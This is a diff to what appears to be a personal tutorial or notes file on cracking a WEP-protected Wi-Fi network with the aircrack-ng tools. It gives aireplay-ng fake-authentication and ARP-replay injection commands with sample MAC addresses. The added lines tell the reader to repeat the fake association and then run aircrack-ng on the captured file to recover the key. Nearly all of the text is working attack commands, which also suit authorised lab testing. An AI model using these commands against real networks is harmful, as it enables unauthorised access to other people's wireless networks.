@@ -57,6 +57,7 @@ airdoump-ng --bssid <mac-address-of-target> --channel <channel> --write arprepla
 # The mac-address of the wireless adapter is the first 12 characters of the unspec field after you've run 
 # your ifconfig
 # on the below command replace the minuses with colons
+# you can repeat the fake auth/ association multiple times for you to be sure that you can still communicate with your AP
 aireplay-ng --fakeauth <number-of-times-to-carry-out-the-attack> -a <mac-address-of-the-target> -h <mac-address-of-wireless-adapter> <name-of-wireless-adapter>
 aireplay-ng --fakeauth 0 -a 64:16:F0:EC:78:F3 -h 48:5D:60:2A:45:25 mon0
 
@@ -69,3 +70,6 @@ aireplay-ng --fakeauth 0 -a 64:16:F0:EC:78:F3 -h 48:5D:60:2A:45:25 mon0
 
 aireplay-ng --arpreplay -b <mac-address-of-the-target> -h <mac-address-of-wireless-adapter> <name-of-wireless-adapter>
 aireplay-ng --arpreplay -b 64:16:F0:EC:78:F3 -h 48:5D:60:2A:45:25 mon0
+
+# then we're going to run aircrack-ng against the file that we captured in order to crack the key
+aircrack-ng basic_web-01.cap
